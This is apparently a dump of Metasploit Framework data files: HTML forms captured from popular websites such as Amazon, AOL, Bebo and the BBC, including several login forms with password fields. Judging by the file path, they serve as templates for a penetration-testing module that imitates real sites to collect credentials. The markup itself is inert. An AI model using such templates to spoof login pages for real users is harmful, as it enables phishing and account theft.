{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/addictinggames.com.txt", "content": "<form action='/search/' method='get' target='_top'> <input name=\"q\" size=\"19\" type=\"text\" id=\"search-input\" value=\"\" maxlength=\"255\" /><input name=\"sa\" type=\"submit\" id=\"search-submit\" value=\"\" /><input name=\"domains\" type=\"hidden\" value=\"\" /><input name=\"sitesearch\" type=\"hidden\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"channel\" type=\"hidden\" value=\"\" /><input name=\"cof\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:47.053025"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/adobe.com.txt", "content": "<form name='globalnav-search' class='en' action='/go/gnav_search' id='globalnav-search' method='get' accept-charset='utf-8'> <input name=\"loc\" type=\"hidden\" value=\"\" /><input name=\"term\" title=\"Search for...\" type=\"text\" id=\"search-input\" /></form>", "timestamp": "2025-10-24T23:39:47.364199"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/adultadworld.com.txt", "content": "<form name='form1' action='Default.aspx' method='post' id='form1'> <input name=\"__VIEWSTATE\" type=\"hidden\" id=\"__VIEWSTATE\" value=\"\" /><input name=\"pubEmail\" type=\"text\" id=\"pubEmail\" /><input name=\"pubURL\" type=\"text\" id=\"pubURL\" /><input name=\"pubPass\" type=\"password\" id=\"pubPass\" /><input name=\"pubJoin\" language=\"javascript\" type=\"submit\" id=\"pubJoin\" value=\"\" onclick=\"javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;pubJoin&quot;, &quot;&quot;, true, &quot;&quot;, &quot;simplesignup.aspx&quot;, false, false))\" /><input name=\"__PREVIOUSPAGE\" type=\"hidden\" id=\"__PREVIOUSPAGE\" value=\"\" /><input name=\"__EVENTVALIDATION\" type=\"hidden\" id=\"__EVENTVALIDATION\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:48.012792"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/adultfriendfinder.com.txt", "content": "<form name='LOGIN' action='https://secure.adultfriendfinder.com/p/login.cgi' method='post' target='_top'> <input name=\"who\" type=\"hidden\" value=\"\" /><input name=\"site\" type=\"hidden\" value=\"\" /><input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"handle\" tabindex=\"1\" class=\"textbox\" type=\"text\" /><input name=\"password\" tabindex=\"2\" class=\"textbox\" type=\"password\" /><input name=\"submit\" type=\"image\" src=\"\" value=\"\" /></form><form name='search_form' action='http://adultfriendfinder.com/p/register.cgi' method='post'> <input name=\"who\" type=\"hidden\" value=\"\" /><input name=\"site\" type=\"hidden\" value=\"\" /><input name=\"searchtype\" type=\"hidden\" value=\"\" /><input name=\"quick_search\" type=\"hidden\" value=\"\" /><input name=\"hottest\" type=\"hidden\" value=\"\" /><input name=\"prefill_from_cookie\" type=\"hidden\" value=\"\" /><input name=\"photo_rating\" type=\"hidden\" value=\"\" /><input name=\"bday_year\" type=\"hidden\" value=\"\" /><input name=\"looking_for_what\" type=\"hidden\" value=\"\" /><input name=\"min_age\" class=\"age\" type=\"text\" value=\"\" onclick=\"if(this.value=='18')this.value=''\" maxlength=\"2\" /><input name=\"max_age\" class=\"age\" type=\"text\" value=\"\" onclick=\"if(this.value=='35')this.value=''\" maxlength=\"2\" /><input name=\"zip\" class=\"zip\" type=\"text\" maxlength=\"5\" /><input type=\"image\" src=\"\" border=\"0\" height=\"23\" width=\"116\" /></form>", "timestamp": "2025-10-24T23:39:48.346465"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/adwords.google.com.txt", "content": "<form name='langform' action='Login' method='GET' id='langform' style='margin-top: 0px'> <input tabindex=\"5\" name=\"null32\" type=\"submit\" value=\"\" /></form><form action='LoginValidation' method='GET' id='loginform'> <input name=\"javascriptEnabled\" type=\"hidden\" value=\"\" /><input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"start\" type=\"submit\" value=\"\" style=\"padding:4px 10px; font-size:130%;font-weight:bold; margin:6px 0;\" /></form>", "timestamp": "2025-10-24T23:39:48.667630"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/aim.com.txt", "content": "<form name='bb_topform' action='http://search.aol.com/aolcom/search?invocationType=hd-aim&query=' id='search'> <input name=\"invocationType\" type=\"hidden\" value=\"\" /><input name=\"query\" class=\"search\" onkeypress=\"return submitHeaderSearch(event);\" type=\"text\" id=\"topquery\" value=\"\" onfocus=\"this.style.color='#000000';this.value='';\" /></form><form name='peopleSearch' action='http://search.aim.com/search?&txtEntry=<KEYWORD>&icid=aimDBProfileSearch_2' onsubmit='pc.search.element=document.getElementById(search_keyword_9tdJT5O23uBO); return pc.search.handler();' id='people_search'> <input name=\"search_keyword\" size=\"\" title=\"search profiles\" class=\"search_keyword\" type=\"text\" id=\"search_keyword_9tdJT5O23uBO\" value=\"\" onfocus=\"pc.search.element=this; pc.search.clearHelp();\" maxlength=\"295\" onblur=\"pc.search.element=this; pc.search.setHelp();\" /><input name=\"search\" title=\"Search Button\" class=\"search_button\" type=\"button\" onmouseover=\"this.className='search_button_over'\" onmouseout=\"this.className=this.className.replace('search_button_over','search_button');\" onclick=\"pc.search.element=document.getElementById('search_keyword_9tdJT5O23uBO'); pc.search.handler();\" /></form>", "timestamp": "2025-10-24T23:39:48.985384"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/alice.it.txt", "content": "<form name='trova' action='http://search.alice.it/search/cgi/search.cgi'> <input name=\"f\" type=\"hidden\" value=\"\" /><input name=\"qs\" type=\"text\" id=\"ricerca\" onfocus=\"javascript: advIsSearchOnFocus=true; return false;\" style=\"float:left\" /></form><form name='form1' action='' method='post'> </form>", "timestamp": "2025-10-24T23:39:49.308700"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/allegro.pl.txt", "content": "<form name='search' action='/search.php' method='get' id='search' accept-charset='utf-8'> <input tabindex=\"1\" name=\"string\" size=\"15\" type=\"text\" id=\"string\" /><input class=\"formSubmit\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:49.648794"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/allocine.fr.txt", "content": "<form name='rech' action='/recherche/' method='get'> <input name=\"motcle\" size=\"48\" type=\"text\" value=\"\" /><input type=\"image\" src=\"\" style=\"border:0\" /><input name=\"rub\" type=\"hidden\" value=\"\" /></form><form name='search' action='/recherche/' method='get'> <input name=\"motcle\" size=\"48\" type=\"text\" value=\"\" /><input type=\"image\" src=\"\" style=\"border:0\" /></form>", "timestamp": "2025-10-24T23:39:49.986606"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/altervista.org.txt", "content": "<form action='http://forum.it.altervista.org/login.php?do=login' method='post' onsubmit='md5hash(vb_login_password,vb_login_md5password,vb_login_md5password_utf)'> <input name=\"vb_login_username\" class=\"areainput1\" type=\"text\" id=\"navbar_username\" value=\"\" onfocus=\"if (this.value == 'Username') this.value = ''; return true;\" /><input name=\"vb_login_password\" class=\"areainput1\" type=\"password\" value=\"\" onfocus=\"if (this.value == 'Password') this.value = ''; return true;\" /><input name=\"cookieuser\" class=\"mini\" type=\"checkbox\" id=\"remember\" value=\"\" /><input name=\"login\" class=\"puls_vai\" type=\"submit\" value=\"\" /><input name=\"s\" type=\"hidden\" value=\"\" /><input name=\"do\" type=\"hidden\" value=\"\" /><input name=\"vb_login_md5password\" type=\"hidden\" /><input name=\"vb_login_md5password_utf\" type=\"hidden\" /></form><form onsubmit='submitSearch(this)' method='GET'> <input name=\"what\" class=\"what\" value=\"\" onfocus=\"this.value='';return true;\" /><input name=\"search\" class=\"puls_cerca\" type=\"submit\" value=\"\" /><input name=\"domains\" type=\"hidden\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"forid\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"oe\" type=\"hidden\" value=\"\" /><input name=\"cof\" type=\"hidden\" value=\"\" /><input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"q\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:50.634240"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/amazon.co.jp.txt", "content": "<form name='site-search' action='/s/ref=nb_ss_gw' method='get' style='width:100%; margin:0 0 0 0; border:0; padding:0 0 0 0;'> <input name=\"__mk_ja_JP\" type=\"hidden\" value=\"\" /><input name=\"field-keywords\" size=\"50\" class=\"searchSelect\" title=\"\u0192T\u0081[\u0192`\" type=\"text\" id=\"twotabsearchtextbox\" value=\"\" style=\"width:100%; background-color: #FFF;\" /><input type=\"image\" src=\"\" onmouseover=\"shiftImage('navGoButtonPanel',0,-38,'navGoButton');\" id=\"navGoButtonPanel\" onfocus=\"shiftImage('navGoButtonPanel',0,-38,'navGoButton');\" onmouseout=\"shiftImage('navGoButtonPanel',0,0,'navGoButton');\" alt=\"Go\" onblur=\"shiftImage('navGoButtonPanel',0,0,'navGoButton');\" /></form><form action='/s/ref=wbnavss/249-9158604-8543509' method='GET'> <input name=\"field-keywords\" size=\"15\" title=\"\u0192T\u0081[\u0192`\" type=\"text\" /><input name=\"__mk_ja_JP\" type=\"hidden\" value=\"\" /><input name=\"Go\" type=\"image\" src=\"\" border=\"0\" height=\"21\" alt=\"Go\" align=\"absmiddle\" width=\"21\" /></form>", "timestamp": "2025-10-24T23:39:50.968648"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/amazon.co.uk.txt", "content": "<form action='/s/ref=wbnavss/026-6472532-1321228' method='GET'> <input name=\"field-keywords\" size=\"15\" type=\"text\" /><input name=\"Go\" type=\"image\" src=\"\" border=\"0\" height=\"22\" align=\"absmiddle\" width=\"21\" /></form>", "timestamp": "2025-10-24T23:39:51.287064"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/amazon.com.txt", "content": "<form name='site-search' action='/s/ref=nb_ss_gw' method='get' style='width:100%; margin:0 0 0 0; border:0; padding:0 0 0 0;'> <input name=\"field-keywords\" size=\"50\" class=\"searchSelect\" title=\"Search for\" type=\"text\" id=\"twotabsearchtextbox\" value=\"\" style=\"width:100%; background-color: #FFF;\" /><input type=\"image\" src=\"\" onmouseover=\"shiftImage('navGoButtonPanel',0,-38,'navGoButton');\" id=\"navGoButtonPanel\" onfocus=\"shiftImage('navGoButtonPanel',0,-38,'navGoButton');\" onmouseout=\"shiftImage('navGoButtonPanel',0,0,'navGoButton');\" alt=\"Go\" onblur=\"shiftImage('navGoButtonPanel',0,0,'navGoButton');\" /></form><form name='webSearchForm' action='http://a9.com/?dns=www&src=amz' method='get' onsubmit='return a9search.submit(a9searchTerm)' target='new_window'> <input name=\"q\" class=\"a9searchTerm\" title=\"A9 Web Search\" type=\"text\" id=\"a9searchTerm\" onfocus=\"a9search.focus()\" maxlength=\"256\" onblur=\"a9search.blur()\" /><input name=\"Go\" type=\"image\" src=\"\" border=\"0\" value=\"\" height=\"17\" alt=\"Search the Web\" width=\"90\" /></form><form action='/s/ref=wbnavss/103-6552040-3030200' method='GET'> <input name=\"field-keywords\" size=\"15\" title=\"Search for\" type=\"text\" /><input name=\"Go\" type=\"image\" src=\"\" border=\"0\" height=\"21\" alt=\"Go\" align=\"absmiddle\" width=\"21\" /></form>", "timestamp": "2025-10-24T23:39:51.709949"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/amazon.de.txt", "content": "<form action='/s/ref=wbnavss/302-8307091-3216067' method='GET'> <input name=\"field-keywords\" size=\"15\" type=\"text\" /><input name=\"__mk_de_DE\" type=\"hidden\" value=\"\" /><input name=\"Go\" type=\"image\" src=\"\" border=\"0\" height=\"18\" align=\"absmiddle\" width=\"25\" /></form>", "timestamp": "2025-10-24T23:39:52.027666"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/anonym.to.txt", "content": "<form name='displayResult' action='#' onsubmit='return false;'> <input name=\"markAll\" class=\"anonym_FormSubmit\" type=\"button\" id=\"markAll\" value=\"\" onclick=\"document.displayResult.embeddingCode.select();\" /></form><form name='anonymizerForm' action='#' onsubmit='generateCode(anonymizerForm, embeddingCode); return false;'> <input name=\"keywords\" class=\"anonym_input\" type=\"text\" id=\"keywordsInput\" /><input class=\"anonym_FormSubmit\" type=\"submit\" id=\"submitButton\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:52.355139"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/answers.com.txt", "content": "<form name='lookup1' action='/main/ntquery' id='lookup1' method='get' onsubmit='return submitHandlerIncr(lookup1);' accept-charset='UTF-8' style='display:inline;'> <input name=\"s\" size=\"30\" autocomplete=\"off\" onkeydown=\"return KeyDown('lookup1',event)\" class=\"tellMeAboutBox\" type=\"text\" id=\"s\" value=\"\" onblur=\"onBlurHandler('lookup1',event)\" maxlength=\"200\" style=\"padding-left:5px;border:1px solid #D0DBEF;margin-top:26px;margin-top:25px; margin-left: 12px; width: 225px; margin-bottom: 3px; vertical-align:bottom;\" /><input name=\"gwp\" type=\"hidden\" value=\"\" /></form><form name='emailForm' action='/main/highlights_email_signup.jsp' id='emailForm' style='margin-left:50px;'> <input name=\"email\" type=\"text\" id=\"email\" style=\"width:120px;\" /><input name=\"listID\" type=\"hidden\" id=\"listID\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form name='games' action='' id='games'> <input name=\"spellingBee\" class=\"gameRadio\" type=\"radio\" value=\"\" /><input name=\"spellingBee\" class=\"gameRadio\" type=\"radio\" value=\"\" /><input name=\"spellingBee\" class=\"gameRadio\" type=\"radio\" value=\"\" /><input name=\"spellingBee\" class=\"gameRadio\" type=\"radio\" value=\"\" /><input name=\"&amp;lid=hp_spellB&amp;lpos=findButton\" class=\"findButton\" type=\"button\" id=\"spellButton\" value=\"\" onclick=\"_hbLink('find_out','home_spellingBee');showAnswer('spellingBee');\" style=\"font-weight:bold;\" /><input name=\"&amp;lid=hp_spellB&amp;lpos=playAgain\" class=\"findButton\" type=\"button\" id=\"playAgain\" value=\"\" onclick=\"_hbLink('play_again','home_spellingBee');location ='http://www.answers.com?r=0#games';\" /></form>", "timestamp": "2025-10-24T23:39:52.701486"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/aol.com.txt", "content": "<form action='http://search.aol.com/aol/search' id='topft2' onsubmit='trimQ(this.q);'> <input name=\"invocationType\" type=\"hidden\" value=\"\" /><input name=\"query\" class=\"q qg\" title=\"Enter search terms here and hit the Enter key to initiate search\" onkeypress=\"omo('topsrch_enter'); return clk(event,'topsrchbut');\" type=\"text\" id=\"topQuery2\" onkeyup=\"chkinp(this)\" onfocus=\"chkinp(this)\" maxlength=\"150\" onblur=\"chkinp(this)\" /><input name=\"do\" class=\"fBt g_\" type=\"submit\" accesskey=\"S\" id=\"topsrchbut\" value=\"\" onclick=\"omo('topsrchbut','topsrch_enter');\" /></form><form action='http://finance.aol.com/usw/quotes/quotesandnews'> <input name=\"sym\" class=\"mSrch\" onkeypress=\"omo('mktsrch_enter');return clk(event,'mktsrchbut');\" type=\"text\" id=\"mQuote\" /><input class=\"fBt g_\" type=\"submit\" id=\"mktsrchbut\" value=\"\" onclick=\"omo('mktsrchbut','mktsrch_enter');\" /></form><form action='/main.adp#rtabs' method='get' onsubmit='setLoc(traffic,this.zip_t.value,portal.traffic.inc,rt2,null,rtFcs);omcl(this,traf_setloc);return false;'> <input name=\"zip_t\" class=\"mSrch\" type=\"text\" id=\"trzip\" value=\"\" maxlength=\"40\" /><input class=\"fBt g_\" type=\"submit\" value=\"\" /><input name=\"rtact\" type=\"hidden\" value=\"\" /></form><form action='/main.adp#rtabs' method='get' onsubmit='setLoc(traffic,this.zip_t.value,portal.traffic.inc,rt2,null,rtFcs);omcl(this,traf_setloc);return false;'> <input class=\"fBt g_\" type=\"submit\" value=\"\" /><input name=\"rtact\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:53.012760"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/apple.com.txt", "content": "<form class='search' action='http://searchcgi.apple.com/cgi-bin/sp/nph-searchpre11.pl' method='post' id='g-search'> <input name=\"oe\" type=\"hidden\" id=\"search-oe\" value=\"\" /><input name=\"access\" type=\"hidden\" id=\"search-access\" value=\"\" /><input name=\"site\" type=\"hidden\" id=\"search-site\" value=\"\" /><input name=\"lr\" type=\"hidden\" id=\"search-lr\" value=\"\" /><input name=\"q\" class=\"g-prettysearch applesearch\" type=\"search\" id=\"sp-searchtext\" accesskey=\"s\" /></form><form action='http://www.apple.com/cgi-bin/nph-menu' id='worldwidelinks' method='post'> </form>", "timestamp": "2025-10-24T23:39:53.352435"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ask.com.txt", "content": "<form action='web' id='sform' onsubmit='if (a10.ss) a10.ss.updateQsrc();' style='margin:0;padding:0'> <input name=\"q\" autocomplete=\"off\" id=\"q\" value=\"\" align=\"bottom\" /><input name=\"qsrc\" type=\"hidden\" id=\"qsrc\" value=\"\" /><input name=\"o\" type=\"hidden\" id=\"origin\" value=\"\" /><input name=\"l\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:53.683956"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/att.com.txt", "content": "<form name='searchForm' action='http://www.att.com/search/integrate' method='post' id='searchForm'> <input name=\"query\" size=\"20\" type=\"text\" id=\"query\" maxlength=\"256\" /><input title=\"Search.\" type=\"image\" src=\"/Common/indc/homepage/images/btn_go.gif\" id=\"searchbuttonGo\" value=\"\" align=\"middle\" alt=\"Go.\" /></form>", "timestamp": "2025-10-24T23:39:54.002537"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/atwiki.jp.txt", "content": "<form action='http://www1.atwiki.jp/guide/' method='get'> <input name=\"andor\" type=\"hidden\" value=\"\" /><input name=\"cmd\" type=\"hidden\" value=\"\" /><input name=\"keyword\" size=\"17\" class=\"inputfield\" type=\"text\" id=\"suchbegriff\" alt=\"search...\" style=\"width:120px\" /><input name=\"submit\" class=\"submit\" type=\"submit\" value=\"\" /></form><form action='http://atwiki.jp/search/' id='searchbox_016309448208105843401:1id2exwtvyq'> <input name=\"cx\" type=\"hidden\" value=\"\" /><input name=\"cof\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"40\" type=\"text\" /><input name=\"sa\" type=\"submit\" value=\"\" /></form><form action='http://www11.atwiki.jp/_mng/new.php' method='post'> <input name=\"wikiid\" tabindex=\"1\" size=\"20\" class=\"reg\" type=\"text\" value=\"\" /><input name=\"mail\" tabindex=\"2\" size=\"20\" class=\"reg\" type=\"text\" value=\"\" /><input name=\"mail2\" tabindex=\"3\" size=\"20\" class=\"reg\" type=\"text\" value=\"\" /><input name=\"pass1\" tabindex=\"4\" size=\"20\" class=\"reg\" type=\"password\" value=\"\" /><input name=\"pass2\" tabindex=\"5\" size=\"20\" class=\"reg\" type=\"password\" value=\"\" /><input name=\"mail_info\" type=\"hidden\" value=\"\" /><input name=\"submit\" tabindex=\"6\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:54.331890"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/aweber.com.txt", "content": "<form action='/search.htm' id='searchbar' method='get'> <input name=\"q\" class=\"searchbar-box\" accesskey=\"4\" value=\"\" /><input class=\"searchbox-button\" type=\"submit\" value=\"\" alt=\"search\" /></form><form action='http://www.aweber.com/scripts/addlead.pl' method='post' onsubmit='exit=false'> <input name=\"name\" size=\"25\" type=\"text\" id=\"name\" value=\"\" /><input name=\"from\" size=\"25\" type=\"text\" id=\"from\" value=\"\" /><input type=\"image\" src=\"img/buttons/testdrive.gif\" id=\"drivebutton\" alt=\"testdrive\" /><input name=\"unit\" type=\"hidden\" value=\"\" /><input name=\"misc\" type=\"hidden\" value=\"\" /><input name=\"redirect\" type=\"hidden\" value=\"\" /><input name=\"meta_adtracking\" type=\"hidden\" value=\"\" /><input name=\"meta_forward_vars\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:54.654587"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/badoo.com.txt", "content": "<form action='http://badoo.com/peoplesearch.phtml?sold2=WfUAcN7m9tVO.yJdl3CDF0RoiSL2ZIB_' method='get'> <input name=\"q\" size=\"30\" type=\"text\" id=\"f_q\" value=\"\" /><input name=\"\" type=\"image\" src=\"\" id=\"f_search_submit\" /></form>", "timestamp": "2025-10-24T23:39:54.982931"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/bbc.co.uk.txt", "content": "<form action='/cgi-bin/search/results.pl' id='hpSearch' method='get'> <input name=\"go\" type=\"hidden\" value=\"\" /><input name=\"scope\" type=\"hidden\" value=\"\" /><input name=\"tab\" checked=\"checked\" type=\"radio\" id=\"hpSearch-all\" value=\"\" /><input name=\"tab\" type=\"radio\" id=\"hpSearch-web\" value=\"\" /><input name=\"q\" size=\"10\" title=\"searchfield\" class=\"altcolour1\" type=\"text\" id=\"searchfield\" /><input name=\"Search\" title=\"Search\" type=\"submit\" id=\"searchbutton\" value=\"\" alt=\"Search\" /></form><form action='/home/set/set.shtml' method='get'> <input name=\"option_e\" type=\"checkbox\" id=\"option_e\" value=\"\" /><input name=\"option_n\" type=\"checkbox\" id=\"option_n\" value=\"\" /><input name=\"option_i\" checked=\"checked\" type=\"checkbox\" id=\"option_i\" value=\"\" /><input name=\"option_h\" type=\"checkbox\" id=\"option_h\" value=\"\" /><input name=\"option_r\" type=\"checkbox\" id=\"option_r\" value=\"\" /><input name=\"option_l\" type=\"checkbox\" id=\"option_l\" value=\"\" /><input name=\"option_m\" type=\"checkbox\" id=\"option_m\" value=\"\" /><input name=\"option_a\" checked=\"checked\" type=\"checkbox\" id=\"option_a\" value=\"\" /><input name=\"option_g\" checked=\"checked\" type=\"checkbox\" id=\"option_g\" value=\"\" /><input name=\"option_k\" type=\"checkbox\" id=\"option_k\" value=\"\" /><input name=\"option_b\" checked=\"checked\" type=\"checkbox\" id=\"option_b\" value=\"\" /><input name=\"option_f\" checked=\"checked\" type=\"checkbox\" id=\"option_f\" value=\"\" /><input name=\"option_j\" type=\"checkbox\" id=\"option_j\" value=\"\" /><input name=\"option_c\" checked=\"checked\" type=\"checkbox\" id=\"option_c\" value=\"\" /><input name=\"option_s\" type=\"checkbox\" id=\"option_s\" value=\"\" /><input name=\"option_p\" checked=\"checked\" type=\"checkbox\" id=\"option_p\" value=\"\" /><input name=\"colour\" checked=\"checked\" type=\"radio\" id=\"colour0\" value=\"\" /><input name=\"colour\" type=\"radio\" id=\"colour1\" value=\"\" /><input name=\"colour\" type=\"radio\" id=\"colour2\" value=\"\" /><input name=\"colour\" type=\"radio\" id=\"colour3\" value=\"\" /><input name=\"colour\" type=\"radio\" id=\"colour4\" value=\"\" /><input name=\"colour\" type=\"radio\" id=\"colour5\" value=\"\" /><input name=\"colour\" type=\"radio\" id=\"colour6\" value=\"\" /><input name=\"colour\" type=\"radio\" id=\"colour7\" value=\"\" /><input name=\"colour\" type=\"radio\" id=\"colour8\" value=\"\" /><input name=\"colour\" type=\"radio\" id=\"colour9\" value=\"\" /><input name=\"colour\" type=\"radio\" id=\"colour10\" value=\"\" /><input name=\"colour\" type=\"radio\" id=\"colour11\" value=\"\" /><input name=\"colour\" type=\"radio\" id=\"colour12\" value=\"\" /><input name=\"colour\" type=\"radio\" id=\"colour13\" value=\"\" /><input class=\"hpButton confirm\" type=\"submit\" id=\"feedSelectionSave\" value=\"\" /></form><form action='/home/' id='local' method='get'> <input name=\"version\" checked=\"checked\" type=\"radio\" id=\"ukvers\" value=\"\" /><input name=\"version\" type=\"radio\" id=\"intvers\" value=\"\" /><input class=\"hpButton confirm\" type=\"submit\" id=\"locsubmit\" value=\"\" /><input class=\"hpButton cancel\" type=\"reset\" id=\"locreset\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:55.332450"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/bebo.com.txt", "content": "<form action='/Search.jsp' method='post' onsubmit='return verifySearch(this, Search...);' id='yahoo-search-form'> <input name=\"SearchTerm\" autocomplete=\"off\" type=\"text\" id=\"search-keywords\" value=\"\" onfocus=\"if(this.value ==\"Search...\") this.value=\"\";\" /><input type=\"image\" src=\"\" id=\"search-button\" value=\"\" /></form><form action='https://secure.bebo.com/SignIn.jsp' id='login-form' method='post'> <input name=\"EmailUsername\" class=\"field\" type=\"text\" id=\"username\" value=\"\" /><input name=\"PasswordHolder\" class=\"field\" type=\"text\" id=\"passwordHolder\" value=\"\" /><input name=\"Password\" class=\"field\" type=\"password\" id=\"password\" value=\"\" style=\"display:none;\" /><input name=\"SignIn\" type=\"image\" src=\"\" id=\"login-button\" value=\"\" alt=\"Login\" /><input name=\"RememberMe\" type=\"checkbox\" id=\"RememberMe\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:55.908940"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/bestbuy.com.txt", "content": "<form name='frmSearch' action='/site/olspage.jsp;jsessionid=ONLGD0QUDYDBXKC4D3JFAHI' method='GET'> <input name=\"_dyncharset\" type=\"hidden\" value=\"\" /><input name=\"searchCatId\" type=\"hidden\" value=\"\" /><input name=\"type\" type=\"hidden\" value=\"\" /><input name=\"st\" size=\"40\" class=\"searchfield\" onkeypress=\"return handleEnterKeyPress(event,this.form,'Keyword or Item #');\" type=\"text\" value=\"\" onclick=\"handleOnClick(this.form, 'Keyword or Item #');\" maxlength=\"80\" /><input name=\"goButton\" type=\"image\" src=\"\" border=\"0\" onclick=\"return ValidateSearchStr(this.form,'Keyword or Item #');\" alt=\"\" /><input name=\"cp\" type=\"hidden\" id=\"cp\" value=\"\" /><input name=\"nrp\" type=\"hidden\" id=\"nrp\" value=\"\" /><input name=\"sp\" type=\"hidden\" id=\"sp\" value=\"\" /><input name=\"qp\" type=\"hidden\" id=\"qp\" value=\"\" /><input name=\"list\" type=\"hidden\" id=\"list\" value=\"\" /><input name=\"iht\" type=\"hidden\" id=\"iht\" value=\"\" /><input name=\"usc\" type=\"hidden\" id=\"usc\" value=\"\" /><input name=\"ks\" type=\"hidden\" id=\"ks\" value=\"\" /></form><form name='logoutForm' action='/site/index.jsp;jsessionid=ONLGD0QUDYDBXKC4D3JFAHI?_DARGS=/site/en_US/global/nav/olsusermessage.jsp' method='post'> <input name=\"_dyncharset\" type=\"hidden\" value=\"\" /><input name=\"/bestbuy/digiterra/userprofiling/SignInProfileFormHandler.logoutSuccessURL\" type=\"hidden\" value=\"\" /><input name=\"_D:/bestbuy/digiterra/userprofiling/SignInProfileFormHandler.logoutSuccessURL\" type=\"hidden\" value=\"\" /><input name=\"/bestbuy/digiterra/userprofiling/SignInProfileFormHandler.logout\" type=\"hidden\" value=\"\" /><input name=\"_D:/bestbuy/digiterra/userprofiling/SignInProfileFormHandler.logout\" type=\"hidden\" value=\"\" /><input name=\"_DARGS\" type=\"hidden\" value=\"\" /></form><form name='zipform' action='http://bestbuy.shoplocal.com/bestbuy/default.aspx' id='nuepzipform' onsubmit='return submitzipform(this);' target='_blank'> <input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"Sniff\" type=\"hidden\" value=\"\" /><input name=\"postback\" type=\"hidden\" value=\"\" /><input name=\"CityStateZip\" type=\"hidden\" id=\"CityStateZip\" value=\"\" maxlength=\"40\" /></form><form name='tempzipform' action='http://bestbuy.shoplocal.com/bestbuy/default.aspx' id='tempnuepzipform'> <input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"Sniff\" type=\"hidden\" value=\"\" /><input name=\"postback\" type=\"hidden\" value=\"\" /><input name=\"CityStateZip\" type=\"hidden\" id=\"CityStateZip2\" value=\"\" maxlength=\"40\" /></form>", "timestamp": "2025-10-24T23:39:56.253517"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/bharatstudent.com.txt", "content": "<form name='searchform' method='post' onsubmit='return searchgo();'> <input name=\"txtname\" class=\"bluetext\" type=\"text\" id=\"txtname\" value=\"\" onfocus=\"javascript: focuscallin();\" onblur=\"javascript: blurcall();\" /><input name=\"Button\" class=\"bluetext\" type=\"button\" value=\"\" onclick=\"javascript: searchgo();\" /></form><form name='loginform' action='login.php' method='post' onsubmit='return membercheck();'> <input name=\"email\" size=\"25\" class=\"bluetext\" type=\"text\" style=\"border: 1px solid #4B8C9A\" /><input name=\"password\" size=\"25\" class=\"bluetext\" type=\"password\" style=\"border: 1px solid #4B8C9A\" /><input name=\"Submit\" class=\"blacktext\" type=\"submit\" value=\"\" /><input name=\"keywordv\" type=\"hidden\" /></form>", "timestamp": "2025-10-24T23:39:56.577757"}
